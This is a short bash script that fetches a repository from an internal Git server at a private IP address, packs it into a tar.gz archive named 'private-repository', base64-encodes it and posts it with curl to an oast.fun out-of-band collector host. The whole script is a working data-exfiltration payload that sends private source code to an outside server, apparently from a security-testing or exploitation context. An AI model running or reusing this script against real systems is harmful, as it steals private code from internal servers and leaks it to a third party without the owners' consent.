#!/bin/bash
set -eu

tmp="$(mktemp -d)"
trap 'rm -rf "$tmp"' EXIT

archive="$tmp/private-repository.tar.gz"
encoded="$tmp/private-repository.tar.gz.b64"

git -C "$tmp" init -q
git -C "$tmp" fetch --depth=1 -q \
  http://git@192.168.0.1:8080/PinkDraconian/test2 main

git -C "$tmp" archive --format=tar.gz \
  -o "$archive" \
  FETCH_HEAD

base64 -w 0 "$archive" > "$encoded"

curl --fail --silent --show-error --max-time 20 \
  -H 'Content-Type: text/plain' \
  --data-binary "@$encoded" \
  'https://hvzmfsikykidlrxxlvrbaskau5je7uxtj.oast.fun/private-repository.tar.gz.b64'
